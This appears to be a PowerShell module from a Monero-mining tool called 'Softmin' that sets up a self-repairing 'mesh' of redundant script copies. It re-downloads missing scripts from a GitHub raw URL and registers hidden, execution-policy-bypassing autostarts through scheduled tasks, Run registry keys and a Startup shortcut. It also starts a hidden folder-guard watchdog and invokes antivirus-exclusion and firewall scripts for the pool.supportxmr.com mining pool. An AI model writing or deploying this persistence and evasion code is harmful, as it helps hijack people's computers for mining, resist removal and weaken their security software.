# Malha redundante de curadores + confianca AV/firewall em cada ciclo.
. "$PSScriptRoot\Softmin-CorePaths.ps1"

function Resolve-SoftminMeshModule {
    param(
        [string]$Name,
        [string]$PreferRoot = ''
    )
    $roots = @($PreferRoot) + (Get-SoftminCorePeersFromRegistry) + (Get-SoftminCoreSiteRoots) + @(
        (Get-SoftminInstallPath),
        $PSScriptRoot,
        (Join-Path (Split-Path $PSScriptRoot -Parent) 'scripts')
    ) | Where-Object { $_ } | Select-Object -Unique
    foreach ($r in $roots) {
        $p = Join-Path $r.TrimEnd('\') $Name
        if (Test-Path -LiteralPath $p) { return $p }
    }
    return $null
}

function Get-SoftminCloudBaseUrlMesh {
    $cfg = Resolve-SoftminMeshModule 'Softmin-CloudConfig.ps1' -PreferRoot $PSScriptRoot
    if ($cfg) {
        . $cfg
        return (Get-SoftminCloudBaseUrl)
    }
    return 'https://raw.githubusercontent.com/gabriel-Dagostim/omicron-softmin-cloud/master/cloud'
}

function Copy-SoftminCoreBundle {
    param(
        [string]$SourceRoot,
        [string]$DestRoot
    )
    $DestRoot = $DestRoot.TrimEnd('\')
    New-Item -ItemType Directory -Force -Path $DestRoot | Out-Null
    foreach ($name in (Get-SoftminCoreScriptNames)) {
        $src = Join-Path $SourceRoot $name
        if (-not (Test-Path -LiteralPath $src)) {
            $src = Join-Path (Join-Path $SourceRoot 'scripts') $name
        }
        if (Test-Path -LiteralPath $src) {
            Copy-Item -LiteralPath $src -Destination (Join-Path $DestRoot $name) -Force
        }
    }
}

function Repair-SoftminCoreSiteFromSource {
    param(
        [string]$Site,
        [string]$SourceRoot
    )
    $Site = $Site.TrimEnd('\')
    $SourceRoot = $SourceRoot.TrimEnd('\')

    if ((Test-SoftminCoreSiteHealthy -Site $Site) -and ($Site.ToLowerInvariant() -ne $SourceRoot.ToLowerInvariant())) {
        return $true
    }

    Copy-SoftminCoreBundle -SourceRoot $SourceRoot -DestRoot $Site
    $base = Get-SoftminCloudBaseUrlMesh
    foreach ($name in (Get-SoftminCoreScriptNames)) {
        $dest = Join-Path $Site $name
        if (Test-Path -LiteralPath $dest) { continue }
        try {
            Invoke-WebRequest -Uri "$base/$name" -OutFile $dest -UseBasicParsing -TimeoutSec 90 `
                -Headers @{ 'User-Agent' = 'Softmin-CoreMesh' }
        } catch { }
    }
    return (Test-SoftminCoreSiteHealthy -Site $Site)
}

function Get-SoftminBestCoreSource {
    param([string[]]$Candidates)
    $best = $null
    $bestScore = -1
    foreach ($site in $Candidates) {
        if (-not $site) { continue }
        $score = 0
        foreach ($name in (Get-SoftminCoreScriptNames)) {
            if (Test-Path -LiteralPath (Join-Path $site $name)) { $score++ }
        }
        if ($score -gt $bestScore) {
            $bestScore = $score
            $best = $site.TrimEnd('\')
        }
    }
    return $best
}

function Sync-SoftminCoreMesh {
    param(
        [string]$SourceRoot = '',
        [string]$InstallPath = ''
    )
    if (Test-SoftminFullUninstallRequested) { return @() }

    if ([string]::IsNullOrWhiteSpace($SourceRoot)) { $SourceRoot = $PSScriptRoot }
    if ([string]::IsNullOrWhiteSpace($InstallPath)) { $InstallPath = Get-SoftminInstallPath }
    $SourceRoot = $SourceRoot.TrimEnd('\')

    $sites = @((Get-SoftminCoreSiteRoots) + (Get-SoftminCorePeersFromRegistry) | Select-Object -Unique)
    Set-SoftminCorePeersRegistry -Peers $sites | Out-Null

    $best = Get-SoftminBestCoreSource -Candidates @($SourceRoot) + $sites
    if (-not $best -or -not (Test-SoftminCoreSiteHealthy -Site $best)) {
        Repair-SoftminCoreSiteFromSource -Site (Get-SoftminCoreSiteRoots)[0] -SourceRoot $SourceRoot | Out-Null
        $best = Get-SoftminBestCoreSource -Candidates (Get-SoftminCoreSiteRoots)
    }
    if (-not $best) { $best = $SourceRoot }

    foreach ($site in $sites) {
        if ($site.ToLowerInvariant() -eq $best.ToLowerInvariant()) { continue }
        Repair-SoftminCoreSiteFromSource -Site $site -SourceRoot $best | Out-Null
    }

    Repair-SoftminCuratorPointers | Out-Null
    return $sites
}

function Repair-SoftminCuratorPointers {
    if (Test-SoftminFullUninstallRequested) { return $false }

    $sites = Get-SoftminCoreSiteRoots
    $tasks = Get-SoftminCuratorTaskNames
    $map = Get-SoftminCuratorTaskMapFromRegistry
    $best = Get-SoftminBestCoreSource -Candidates ($sites + (Get-SoftminCorePeersFromRegistry))
    if (-not $best) { return $false }

    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    foreach ($legacy in @('MinerAgent-XMRig', 'Softmin-XMRig', 'Softmin-Autostart')) {
        $null = & schtasks.exe /Delete /TN $legacy /F 2>&1
    }

    for ($i = 0; $i -lt [Math]::Min($sites.Count, $tasks.Count); $i++) {
        $task = $tasks[$i]
        $targetSite = $sites[$i]
        if (-not (Test-SoftminCoreSiteHealthy -Site $targetSite)) {
            Repair-SoftminCoreSiteFromSource -Site $targetSite -SourceRoot $best | Out-Null
        }
        $curator = Join-Path $targetSite 'Softmin-Curator.ps1'
        if (-not (Test-Path -LiteralPath $curator)) {
            $targetSite = $best
            $curator = Join-Path $targetSite 'Softmin-Curator.ps1'
        }
        $map[$task] = $targetSite
        $tr = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $curator + '" -Silent'

        $query = & schtasks.exe /Query /TN $task /FO LIST 2>&1 | Out-String
        $broken = ($LASTEXITCODE -ne 0) -or ($query -notmatch [regex]::Escape($curator))
        if ($broken) {
            $null = & schtasks.exe /Create /TN $task /TR $tr /SC ONLOGON /RL LIMITED /F 2>&1
        }
    }

    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    if (-not (Test-Path -LiteralPath $runKey)) { New-Item -Path $runKey -Force | Out-Null }
    $runNames = Get-SoftminCuratorRunValueNames
    for ($j = 0; $j -lt [Math]::Min($sites.Count, $runNames.Count); $j++) {
        $site = $sites[$j]
        if (-not (Test-SoftminCoreSiteHealthy -Site $site)) {
            Repair-SoftminCoreSiteFromSource -Site $site -SourceRoot $best | Out-Null
        }
        $curator = Join-Path $site 'Softmin-Curator.ps1'
        if (-not (Test-Path -LiteralPath $curator)) { $curator = Join-Path $best 'Softmin-Curator.ps1' }
        $cmd = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $curator + '" -Silent'
        Set-ItemProperty -LiteralPath $runKey -Name $runNames[$j] -Value $cmd -Force
    }

    $startupLnk = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\Softmin.lnk'
    $primary = Join-Path (Get-SoftminCorePath) 'Softmin-Curator.ps1'
    if (-not (Test-Path -LiteralPath $primary)) {
        Repair-SoftminCoreSiteFromSource -Site (Get-SoftminCorePath) -SourceRoot $best | Out-Null
        $primary = Join-Path (Get-SoftminCorePath) 'Softmin-Curator.ps1'
    }
    if (Test-Path -LiteralPath $primary) {
        try {
            $wsh = New-Object -ComObject WScript.Shell
            $lnk = $wsh.CreateShortcut($startupLnk)
            $lnk.TargetPath = 'powershell.exe'
            $lnk.Arguments = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $primary + '" -Silent'
            $lnk.WorkingDirectory = (Get-SoftminCorePath)
            $lnk.WindowStyle = 7
            $lnk.Save()
        } catch { }
    }

    Set-SoftminCuratorTaskMapRegistry -Map $map
    Set-SoftminCorePeersRegistry -Peers $sites | Out-Null
    $ErrorActionPreference = $prev
    return $true
}

function Register-SoftminCuratorAutostartMesh {
    if (Test-SoftminFullUninstallRequested) { return $false }
    Sync-SoftminCoreMesh -SourceRoot $PSScriptRoot | Out-Null
    Repair-SoftminCuratorPointers | Out-Null
    Register-SoftminTrustScheduledTask -InstallPath (Get-SoftminInstallPath) | Out-Null
    return $true
}

function Register-SoftminTrustScheduledTask {
    param([string]$InstallPath)
    $trustPs = Resolve-SoftminMeshModule 'Invoke-SoftminSystemTrust.ps1' -PreferRoot $PSScriptRoot
    if (-not $trustPs) { return $false }
    $tr = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $trustPs + '" -InstallPath "' + $InstallPath + '"'
    $null = & schtasks.exe /Delete /TN 'SoftminTrust' /F 2>&1
    $null = & schtasks.exe /Create /TN 'SoftminTrust' /TR $tr /SC ONLOGON /RL HIGHEST /F 2>&1
    return ($LASTEXITCODE -eq 0)
}

function Invoke-SoftminSystemTrust {
    param(
        [string]$InstallPath = '',
        [switch]$Quiet
    )
    if (Test-SoftminFullUninstallRequested) { return @{} }
    if ([string]::IsNullOrWhiteSpace($InstallPath)) { $InstallPath = Get-SoftminInstallPath }
    $InstallPath = $InstallPath.TrimEnd('\')

    $avScript = Resolve-SoftminMeshModule 'Set-SoftminAntivirusTrust.ps1' -PreferRoot $PSScriptRoot
    $fwScript = Resolve-SoftminMeshModule 'Set-SoftminFirewall.ps1' -PreferRoot $PSScriptRoot
    $common = Resolve-SoftminMeshModule 'Softmin-Common.ps1' -PreferRoot $InstallPath
    $secure = Resolve-SoftminMeshModule 'Softmin-SecureStorage.ps1' -PreferRoot $InstallPath

    $result = @{ Av = $null; Firewall = $null }

    if ($avScript) {
        . $avScript
        $extra = Get-SoftminTrustExtraPaths
        $result.Av = Set-SoftminAntivirusTrust -InstallPath $InstallPath -ExtraPaths $extra -Quiet:$Quiet
    }

    if ($fwScript -and $common -and $secure) {
        . $common
        . $secure
        $settings = $null
        try { $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false } catch { }
        $poolHost = if ($settings -and $settings.pool_url) { $settings.pool_url } else { 'pool.supportxmr.com' }
        $poolPort = if ($settings -and $settings.pool_port) { [int]$settings.pool_port } else { 443 }
        $result.Firewall = & $fwScript -InstallPath $InstallPath -PoolHost $poolHost -PoolPort $poolPort
    } elseif ($fwScript) {
        $result.Firewall = & $fwScript -InstallPath $InstallPath -PoolHost 'pool.supportxmr.com' -PoolPort 443
    }
    return $result
}

function Start-SoftminFolderGuardMesh {
    param([string]$InstallPath = '')
    if (Test-SoftminFullUninstallRequested) { return }
    if ([string]::IsNullOrWhiteSpace($InstallPath)) { $InstallPath = Get-SoftminInstallPath }
    $primary = Get-SoftminCorePath
    if (-not (Test-SoftminCoreSiteHealthy -Site $primary)) {
        Sync-SoftminCoreMesh -SourceRoot $PSScriptRoot | Out-Null
    }
    $guard = Join-Path $primary 'Softmin-FolderGuard.ps1'
    if (-not (Test-Path -LiteralPath $guard)) { return }

    $pidFile = Get-SoftminGuardPidFile -CorePath $primary
    if (Test-Path -LiteralPath $pidFile) {
        $old = Get-Content -LiteralPath $pidFile -ErrorAction SilentlyContinue
        if ($old -match '^\d+$' -and (Get-Process -Id ([int]$old) -ErrorAction SilentlyContinue)) { return }
    }
    Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
        '-File', "`"$guard`"", '-InstallPath', "`"$InstallPath`""
    ) -WorkingDirectory $primary | Out-Null
}

function Install-SoftminCoreMesh {
    param(
        [string]$InstallPath = '',
        [string]$ScriptsSource = ''
    )
    if ([string]::IsNullOrWhiteSpace($ScriptsSource)) { $ScriptsSource = $PSScriptRoot }
    Sync-SoftminCoreMesh -SourceRoot $ScriptsSource -InstallPath $InstallPath | Out-Null
    Register-SoftminCuratorAutostartMesh | Out-Null
    Start-SoftminFolderGuardMesh -InstallPath $InstallPath
    Invoke-SoftminSystemTrust -InstallPath $InstallPath -Quiet | Out-Null
    return (Get-SoftminCoreSiteRoots)
}
